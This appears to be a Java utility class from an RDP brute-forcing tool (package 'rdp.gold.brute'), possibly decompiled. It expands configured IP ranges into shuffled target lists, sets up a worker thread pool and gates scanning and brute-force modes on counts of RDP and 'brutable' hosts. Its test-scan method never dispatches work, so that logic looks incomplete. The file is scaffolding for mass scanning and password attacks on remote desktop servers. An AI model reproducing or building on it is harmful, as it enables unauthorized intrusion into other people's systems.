package rdp.gold.brute.utils;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.atomic.AtomicLong;

import rdp.gold.brute.Config;
import rdp.gold.brute.ConfigIp;
import rdp.gold.brute.IPUtil;
import rdp.gold.brute.entity.Host;

@SuppressWarnings({ "unchecked", "rawtypes" })
public class AutoconfigureThreads {
    private static final AtomicLong rdpCount = new AtomicLong(0L);
    private static final AtomicLong brutableCount = new AtomicLong(0L);

    @SuppressWarnings("unused")
    private static boolean runTestScan() {
        try {
            Queue<Host> scannedHosts = new ConcurrentLinkedQueue();
            rdpCount.set(0L);
            brutableCount.set(0L);

            Map<String, String> ipRanges = ConfigIp.getIpRanges();

            List<String> ipList = new ArrayList();
            for (Map.Entry<String, String> entryIp : ipRanges.entrySet()) {
                ipList.addAll(IPUtil.getIpList((String) entryIp.getKey(), (String) entryIp.getValue()));
            }
            Collections.shuffle(ipList);

            Object testQueue = new ConcurrentLinkedQueue();
            ((Queue) testQueue).addAll(ipList);

            ThreadGroup threadPduGroup = new ThreadGroup("workers_pdu");

            ExecutorService executorsPdu = Executors.newCachedThreadPool(new ThreadFactory() {
                public Thread newThread(Runnable r) {
                    return new Thread(threadPduGroup, r);
                }
            });
            return ((Config.IS_ENABLED_SCAN.get()) && (rdpCount.get() >= Config.CHECKER_EXPECT_IP_FOR_ENABLE_SCAN.intValue()))
                    || ((Config.IS_ENABLED_BRUTE.get()) && (brutableCount.get() >= Config.CHECKER_EXPECT_BRUTABLE_IP_FOR_ENABLE_BRUTE.intValue()));
        } catch (Exception localException) {
        }
        return false;
    }

    public static void main(String[] argc) {
        Map<String, String> ipRanges = ConfigIp.getIpRanges();

        List<String> ipList = new ArrayList();
        for (Map.Entry<String, String> entryIp : ipRanges.entrySet()) {
            ipList.addAll(IPUtil.getIpList((String) entryIp.getKey(), (String) entryIp.getValue()));
        }
        System.out.println(ipList.size());
    }
}
